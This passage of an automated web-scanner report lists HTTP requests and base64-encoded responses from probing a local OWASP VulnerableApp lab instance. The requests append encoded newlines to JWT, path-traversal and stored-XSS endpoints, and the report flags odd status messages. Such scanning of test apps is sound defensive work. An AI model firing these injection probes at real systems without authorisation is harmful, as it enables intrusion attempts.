        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200 OK</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:04:20 GMT" />
            <header field="Content-Type" content="text/html" />
            <header field="Content-Length" content="2398" />
            <header field="Last-Modified" content="Sun, 03 Dec 2023 20:44:36 GMT" />
            <header field="Connection" content="keep-alive" />
            <header field="ETag" content="&quot;656ce8b4-95e&quot;" />
            <header field="Accept-Ranges" content="bytes" />
        </headers>
        <body content-encoding="base64">PCFkb2N0eXBlIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjxtZXRhIGNoYXJzZXQ9InV0Zi04Ii8+PGxpbmsgcmVsPSJpY29uIiBocmVmPSIvZmF2aWNvbi5pY28iLz48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSIvPjxtZXRhIG5hbWU9InRoZW1lLWNvbG9yIiBjb250ZW50PSIjMDAwMDAwIi8+PG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9Ik93YXNwIFZ1bG5lcmFibGVBcHAgRmFjYWRlIi8+PGxpbmsgcmVsPSJhcHBsZS10b3VjaC1pY29uIiBocmVmPSIvbG9nbzE5Mi5wbmciLz48bGluayByZWw9Im1hbmlmZXN0IiBocmVmPSIvbWFuaWZlc3QuanNvbiIvPjx0aXRsZT5WdWxuZXJhYmxlQXBwLUZhY2FkZTwvdGl0bGU+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iR2xvYmFsVXRpbGl0eS5qcyI+PC9zY3JpcHQ+PGxpbmsgaHJlZj0iL3N0YXRpYy9jc3MvMi42ZDAyMjA0NS5jaHVuay5jc3MiIHJlbD0ic3R5bGVzaGVldCI+PGxpbmsgaHJlZj0iL3N0YXRpYy9jc3MvbWFpbi44MmUzOWQ5My5jaHVuay5jc3MiIHJlbD0ic3R5bGVzaGVldCI+PC9oZWFkPjxib2R5Pjxub3NjcmlwdD5Zb3UgbmVlZCB0byBlbmFibGUgSmF2YVNjcmlwdCB0byBydW4gdGhpcyBhcHAuPC9ub3NjcmlwdD48ZGl2IGlkPSJyb290Ij48L2Rpdj48ZGl2IGlkPSJzY3JpcHRzIj48L2Rpdj48ZGl2IGlkPSJzdHlsZXMiPjwvZGl2PjxzY3JpcHQ+IWZ1bmN0aW9uKGUpe2Z1bmN0aW9uIHIocil7Zm9yKHZhciBuLGEscD1yWzBdLGY9clsxXSxsPXJbMl0sYz0wLHM9W107YzxwLmxlbmd0aDtjKyspYT1wW2NdLE9iamVjdC5wcm90b3R5cGUuaGFzT3duUHJvcGVydHkuY2FsbChvLGEpJiZvW2FdJiZzLnB1c2gob1thXVswXSksb1thXT0wO2ZvcihuIGluIGYpT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKGYsbikmJihlW25dPWZbbl0pO2ZvcihpJiZpKHIpO3MubGVuZ3RoOylzLnNoaWZ0KCkoKTtyZXR1cm4gdS5wdXNoLmFwcGx5KHUsbHx8W10pLHQoKX1mdW5jdGlvbiB0KCl7Zm9yKHZhciBlLHI9MDtyPHUubGVuZ3RoO3IrKyl7Zm9yKHZhciB0PXVbcl0sbj0hMCxwPTE7cDx0Lmxlbmd0aDtwKyspe3ZhciBmPXRbcF07MCE9PW9bZl0mJihuPSExKX1uJiYodS5zcGxpY2Uoci0tLDEpLGU9YShhLnM9dFswXSkpfXJldHVybiBlfXZhciBuPXt9LG89ezE6MH0sdT1bXTtmdW5jdGlvbiBhKHIpe2lmKG5bcl0pcmV0dXJuIG5bcl0uZXhwb3J0czt2YXIgdD1uW3JdPXtpOnIsbDohMSxleHBvcnRzOnt9fTtyZXR1cm4gZVtyXS5jYWxsKHQuZXhwb3J0cyx0LHQuZXhwb3J0cyxhKSx0Lmw9ITAsdC5leHBvcnRzfWEubT1lLGEuYz1uLGEuZD1mdW5jdGlvbihlLHIsdCl7YS5vKGUscil8fE9iamVjdC5kZWZpbmVQcm9wZXJ0eShlLHIse2VudW1lcmFibGU6ITAsZ2V0OnR9KX0sYS5yPWZ1bmN0aW9uKGUpeyJ1bmRlZmluZWQiIT10eXBlb2YgU3ltYm9sJiZTeW1ib2wudG9TdHJpbmdUYWcmJk9iamVjdC5kZWZpbmVQcm9wZXJ0eShlLFN5bWJvbC50b1N0cmluZ1RhZyx7dmFsdWU6Ik1vZHVsZSJ9KSxPYmplY3QuZGVmaW5lUHJvcGVydHkoZSwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSl9LGEudD1mdW5jdGlvbihlLHIpe2lmKDEmciYmKGU9YShlKSksOCZyKXJldHVybiBlO2lmKDQmciYmIm9iamVjdCI9PXR5cGVvZiBlJiZlJiZlLl9fZXNNb2R1bGUpcmV0dXJuIGU7dmFyIHQ9T2JqZWN0LmNyZWF0ZShudWxsKTtpZihhLnIodCksT2JqZWN0LmRlZmluZVByb3BlcnR5KHQsImRlZmF1bHQiLHtlbnVtZXJhYmxlOiEwLHZhbHVlOmV9KSwyJnImJiJzdHJpbmciIT10eXBlb2YgZSlmb3IodmFyIG4gaW4gZSlhLmQodCxuLGZ1bmN0aW9uKHIpe3JldHVybiBlW3JdfS5iaW5kKG51bGwsbikpO3JldHVybiB0fSxhLm49ZnVuY3Rpb24oZSl7dmFyIHI9ZSYmZS5fX2VzTW9kdWxlP2Z1bmN0aW9uKCl7cmV0dXJuIGUuZGVmYXVsdH06ZnVuY3Rpb24oKXtyZXR1cm4gZX07cmV0dXJuIGEuZChyLCJhIixyKSxyfSxhLm89ZnVuY3Rpb24oZSxyKXtyZXR1cm4gT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKGUscil9LGEucD0iLyI7dmFyIHA9dGhpc1sid2VicGFja0pzb25wZmFjYWRlLWFwcCJdPXRoaXNbIndlYnBhY2tKc29ucGZhY2FkZS1hcHAiXXx8W10sZj1wLnB1c2guYmluZChwKTtwLnB1c2g9cixwPXAuc2xpY2UoKTtmb3IodmFyIGw9MDtsPHAubGVuZ3RoO2wrKylyKHBbbF0pO3ZhciBpPWY7dCgpfShbXSk8L3NjcmlwdD48c2NyaXB0IHNyYz0iL3N0YXRpYy9qcy8yLmM5NTM5ZTg1LmNodW5rLmpzIj48L3NjcmlwdD48c2NyaXB0IHNyYz0iL3N0YXRpYy9qcy9tYWluLmQyZGUxYjQyLmNodW5rLmpzIj48L3NjcmlwdD48L2JvZHk+PC9odG1sPg==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[128, 129, 130, 131, 135, 138, 140, 142, 144, 146, 148, 150, 152, 153, 166, 167, 168, 87, 91, 92, 96, 97, 99, 103, 104, 105, 111, 112, 123, 127]" method="GET" name="Strange HTTP Reason message" plugin="strange_reason" severity="Information" url="http://localhost/VulnerableApp%0A" var="None">
    <description>The remote web server sent 30 HTTP responses with the uncommon status message &quot;&quot;, manual inspection is recommended. The first ten URLs which sent the uncommon message are:
 - http://localhost/VulnerableApp%0A
 - http://localhost/VulnerableApp/BlindSQLInjectionVulnerability%0A
 - http://localhost/VulnerableApp/BlindSQLInjectionVulnerability/LEVEL_1
 - http://localhost/VulnerableApp/CommandInjection%0A
 - http://localhost/VulnerableApp/CommandInjection/LEVEL_1
 - http://localhost/VulnerableApp/CommandInjection/LEVEL_2
 - http://localhost/VulnerableApp/CommandInjection/LEVEL_6
 - http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability%0A
 - http://localhost/VulnerableApp/ErrorBasedSQLInjectionVulnerability/LEVEL_1
 - http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection%0A
</description>


    <http-transactions>
            <http-transaction id="128">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM4LjE0MiswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSldUVnVsbmVyYWJpbGl0eSUwQSJ9</body>
    </http-response>

</http-transaction>
            <http-transaction id="129">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM4LjE3NCswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSldUVnVsbmVyYWJpbGl0eS9MRVZFTF8xJTBBIn0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="130">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_1?JWT=%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:38 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
            <http-transaction id="131">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_2%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM4LjMyNyswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSldUVnVsbmVyYWJpbGl0eS9MRVZFTF8yJTBBIn0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="135">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_3%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM4LjQ1MiswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSldUVnVsbmVyYWJpbGl0eS9MRVZFTF8zJTBBIn0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="138">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_4%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM4LjU3NiswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSldUVnVsbmVyYWJpbGl0eS9MRVZFTF80JTBBIn0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="140">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_5%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM4Ljc1NCswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSldUVnVsbmVyYWJpbGl0eS9MRVZFTF81JTBBIn0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="142">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_6%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM4Ljg1NCswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSldUVnVsbmVyYWJpbGl0eS9MRVZFTF82JTBBIn0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="144">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_7%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:38 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM4LjkxNyswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSldUVnVsbmVyYWJpbGl0eS9MRVZFTF83JTBBIn0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="146">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_8%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:39 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM5LjAxMSswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSldUVnVsbmVyYWJpbGl0eS9MRVZFTF84JTBBIn0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="148">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_9%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:39 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM5LjEyNiswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSldUVnVsbmVyYWJpbGl0eS9MRVZFTF85JTBBIn0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="150">

    <http-request>
        <status>GET http://localhost/VulnerableApp/JWTVulnerability/LEVEL_10%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:39 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM5LjIzNiswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvSldUVnVsbmVyYWJpbGl0eS9MRVZFTF8xMCUwQSJ9</body>
    </http-response>

</http-transaction>
            <http-transaction id="152">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:39 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM5LjM4MSswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvUGF0aFRyYXZlcnNhbCUwQSJ9</body>
    </http-response>

</http-transaction>
            <http-transaction id="153">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PathTraversal/LEVEL_1?fileName=UserInfo.json%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:39 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjpudWxsLCJpc1ZhbGlkIjpmYWxzZX0=</body>
    </http-response>

</http-transaction>
            <http-transaction id="166">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:39 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjM5Ljk3OCswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvUGVyc2lzdGVudFhTU0luSFRNTFRhZ1Z1bG5lcmFiaWxpdHklMEEifQ==</body>
    </http-response>

</http-transaction>
            <http-transaction id="167">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:40 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
            <header field="Vary" content="Origin" />
        </headers>
        <body content-encoding="base64">eyJ0aW1lc3RhbXAiOiIyMDI0LTAzLTIwVDE3OjA1OjQwLjA1MSswMDowMCIsInN0YXR1cyI6NDA0LCJlcnJvciI6Ik5vdCBGb3VuZCIsIm1lc3NhZ2UiOiIiLCJwYXRoIjoiL1Z1bG5lcmFibGVBcHAvUGVyc2lzdGVudFhTU0luSFRNTFRhZ1Z1bG5lcmFiaWxpdHkvTEVWRUxfMSUwQSJ9</body>
    </http-response>

</http-transaction>
            <http-transaction id="168">

    <http-request>
        <status>GET http://localhost/VulnerableApp/PersistentXSSInHTMLTagVulnerability/LEVEL_1?comment=AWvQIRdUANpVKLywQHwweTFi%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:40 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="50" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">PGRpdiBpZD0iY29tbWVudHMiPkFXdlFJUmRVQU5wVktMeXdRSHd3ZVRGaQo8L2Rpdj4=</body>
    </http-response>

</http-transaction>
            <http-transaction id="87">

    <http-request>
        <status>GET http://localhost/VulnerableApp%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-type" content="application/x-www-form-urlencoded" />
            <header field="Content-length" content="0" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 404</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:05:36 GMT" />
            <header field="Content-Type" content="text/html;charset=utf-8" />
            <header field="Content-Length" content="431" />
            <header field="Connection" content="keep-alive" />
            <header field="Content-Language" content="en" />
        </headers>
